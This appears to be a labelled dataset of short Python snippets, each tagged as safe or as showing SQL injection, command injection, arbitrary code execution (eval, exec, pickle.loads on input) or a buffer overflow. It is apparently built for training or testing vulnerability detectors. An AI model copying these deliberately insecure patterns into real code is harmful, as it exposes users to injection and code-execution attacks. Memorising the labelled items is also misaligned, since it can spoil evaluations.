"print('Hello, world!')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
import os
os.system(input('Command: '))","['sqli', 'command_injection']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"eval(input('Expression: '))
import os
os.system(input('Command: '))","['arbitrary_code_exec', 'command_injection']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"for i in range(5):
    print(i)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['buffer_overflow', 'sqli']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"for i in range(5):
    print(i)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import os
os.system(input('Command: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"print('Hello, world!')",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"exec(input('Code: '))
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['arbitrary_code_exec', 'command_injection']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import pickle
pickle.loads(input('Serialized data: '))","['buffer_overflow', 'arbitrary_code_exec']"
"print('Hello, world!')",['none']
"exec(input('Code: '))
import os
os.system(input('Command: '))","['arbitrary_code_exec', 'command_injection']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
"import pickle
pickle.loads(input('Serialized data: '))
import os
os.system(input('Command: '))","['arbitrary_code_exec', 'command_injection']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"print('Hello, world!')",['none']
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"for i in range(5):
    print(i)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import pickle
pickle.loads(input('Serialized data: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['arbitrary_code_exec', 'sqli']"
"for i in range(5):
    print(i)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
exec(input('Code: '))","['sqli', 'arbitrary_code_exec']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
import os
os.system(input('Command: '))","['sqli', 'command_injection']"
"for i in range(5):
    print(i)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import pickle
pickle.loads(input('Serialized data: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import pickle
pickle.loads(input('Serialized data: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"for i in range(5):
    print(i)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['buffer_overflow', 'sqli']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
eval(input('Expression: '))","['sqli', 'arbitrary_code_exec']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import os
os.system(input('Command: '))","['buffer_overflow', 'command_injection']"
"print('Hello, world!')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
import pickle
pickle.loads(input('Serialized data: '))","['command_injection', 'arbitrary_code_exec']"
"for i in range(5):
    print(i)",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import os
os.system(input('Command: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
import pickle
pickle.loads(input('Serialized data: '))","['command_injection', 'arbitrary_code_exec']"
"for i in range(5):
    print(i)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import pickle
pickle.loads(input('Serialized data: '))
import os
os.system(input('Command: '))","['arbitrary_code_exec', 'command_injection']"
"for i in range(5):
    print(i)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
exec(input('Code: '))","['sqli', 'arbitrary_code_exec']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"exec(input('Code: '))
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['arbitrary_code_exec', 'command_injection']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['sqli', 'command_injection']"
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import os
os.system(input('Command: '))","['buffer_overflow', 'command_injection']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"print('Hello, world!')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"print('Hello, world!')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"print('Hello, world!')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['sqli', 'command_injection']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
"exec(input('Code: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['arbitrary_code_exec', 'sqli']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"for i in range(5):
    print(i)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"print('Hello, world!')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"for i in range(5):
    print(i)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"eval(input('Expression: '))
import os
os.system(input('Command: '))","['arbitrary_code_exec', 'command_injection']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
import pickle
pickle.loads(input('Serialized data: '))","['sqli', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['buffer_overflow', 'sqli']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import os
os.system(input('Command: '))",['command_injection']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"print('Hello, world!')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"print('Hello, world!')",['none']
"import pickle
pickle.loads(input('Serialized data: '))
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['arbitrary_code_exec', 'command_injection']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"print('Hello, world!')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"print('Hello, world!')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import os
os.system(input('Command: '))",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import os
os.system(input('Command: '))
import pickle
pickle.loads(input('Serialized data: '))","['command_injection', 'arbitrary_code_exec']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"eval(input('Expression: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
"import os
os.system(input('Command: '))",['command_injection']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"print('Hello, world!')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"print('Hello, world!')",['none']
"exec(input('Code: '))
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['arbitrary_code_exec', 'command_injection']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"eval(input('Expression: '))
import os
os.system(input('Command: '))","['arbitrary_code_exec', 'command_injection']"
"print('Hello, world!')",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import os
os.system(input('Command: '))",['command_injection']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
import pickle
pickle.loads(input('Serialized data: '))","['command_injection', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import os
os.system(input('Command: '))","['buffer_overflow', 'command_injection']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"eval(input('Expression: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['arbitrary_code_exec', 'sqli']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import os
os.system(input('Command: '))",['command_injection']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
import pickle
pickle.loads(input('Serialized data: '))","['sqli', 'arbitrary_code_exec']"
"for i in range(5):
    print(i)",['none']
"eval(input('Expression: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['arbitrary_code_exec', 'sqli']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import os
os.system(input('Command: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['buffer_overflow', 'sqli']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))",['command_injection']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
eval(input('Expression: '))","['buffer_overflow', 'arbitrary_code_exec']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import os
os.system(input('Command: '))","['buffer_overflow', 'command_injection']"
"print('Hello, world!')",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"print('Hello, world!')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['buffer_overflow', 'sqli']"
"for i in range(5):
    print(i)",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"print('Hello, world!')",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
import os
os.system(input('Command: '))","['sqli', 'command_injection']"
"print('Hello, world!')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"exec(input('Code: '))
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['arbitrary_code_exec', 'command_injection']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['buffer_overflow', 'sqli']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['buffer_overflow', 'command_injection']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import os
os.system(input('Command: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"print('Hello, world!')",['none']
"import pickle
pickle.loads(input('Serialized data: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import pickle
pickle.loads(input('Serialized data: '))","['buffer_overflow', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
